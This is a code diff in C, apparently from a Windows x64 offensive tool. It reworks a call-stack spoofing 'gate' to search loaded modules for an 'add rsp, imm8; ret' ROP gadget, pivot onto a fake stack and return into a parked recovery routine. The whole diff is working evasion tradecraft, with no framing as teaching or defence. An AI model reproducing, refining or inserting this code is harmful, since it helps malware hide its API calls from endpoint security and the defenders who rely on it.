@@ -51,6 +51,7 @@ void gate_spoof_recovery(void);                     /* asm PROC - bare symbol */
 static unsigned char *  g_gate_page;
 static unsigned long long g_gate_pivot;
 static unsigned long long g_gate_gadget;
+static unsigned long    g_gate_hop;   /* 8 + gadget imm8: recovery slot offset */
 static volatile long    g_gate_spoof_ready; /* 0=unknown, 1=ready, 2=plain */
 
 /* ---------------- gate enablement ---------------- */
@@ -102,7 +103,14 @@ static BOOL gate_find_gadget(unsigned long long * out_gadget, unsigned long long
 			end = p + sec->Misc.VirtualSize - 5;
 			for (; p < end; p++) {
 				DWORD sz = 0x48;
-				if (p[0] != 0x5D || p[1] != 0xC3) /* pop rbp; ret */
+				/* add rsp, imm8; ret  (48 83 C4 xx C3): after fn's ret the
+				 * gadget skips the dead shadow+stack-arg area and rets into
+				 * the recovery address parked above the 8-arg slot block.
+				 * The pop-rbp shape was unusable - its pop slots live in the
+				 * fn-owned shadow space. */
+				if (p[0] != 0x48 || p[1] != 0x83 || p[2] != 0xC4 || p[4] != 0xC3)
+					continue;
+				if (p[3] < 0x40 || p[3] > 0x70)
 					continue;
 				KD("gate: gadget hit mod=", (long)m);
 				/* extent from the gadget address through its function frame;
@@ -113,6 +121,7 @@ static BOOL gate_find_gadget(unsigned long long * out_gadget, unsigned long long
 					sz = 0x48;
 				*out_gadget = (unsigned long long)p;
 				*out_extent = sz;
+				g_gate_hop = 8 + p[3];
 				return TRUE;
 			}
 		}
@@ -161,7 +170,7 @@ static void gate_init_spoof(void)
 	 * fn preserves rbp (=ctx+0x10 from the asm prologue), so the popped
 	 * value matches what gate_spoof_recovery expects. */
 	g_gate_pivot = (unsigned long long)g_gate_page + 0x8000;
-	slot = g_gate_pivot + 0x40;
+	slot = g_gate_pivot + 0x80; /* above the parked recovery slot */
 	for (i = 0; i < 4; i++) {
 		*(unsigned long long *)slot = fr[i];
 		slot += sizes[i];
@@ -218,11 +227,10 @@ unsigned long long gate_dispatch(FUNCTION_CALL * fc)
 		ctx.fake_rsp = g_gate_pivot;
 		for (i = 0; i < 4 && i < fc->numOfArgs; i++)
 			ctx.args[i] = fc->args[i];
-		/* pop-rbp hop payload: the gadget pops the rbp value then rets
-		 * into recovery (both live on the fake stack, above the shadow) */
-		*(unsigned long long *)(g_gate_pivot + 0x08) =
-			(unsigned long long)(&ctx) + 0x10;
-		*(unsigned long long *)(g_gate_pivot + 0x10) =
+		/* add-rsp hop: park the recovery address above the 8-arg stack
+		 * block; the gadget skips the dead shadow+args area and rets here
+		 * (rbp survives the call = ctx+0x10, as the asm prologue set it) */
+		*(unsigned long long *)(g_gate_pivot + g_gate_hop) =
 			(unsigned long long)&gate_spoof_recovery;
 		/* stack args 5..8 pre-lay into the fake frame's arg area */
 		for (i = 4; i < fc->numOfArgs && i < 8; i++)
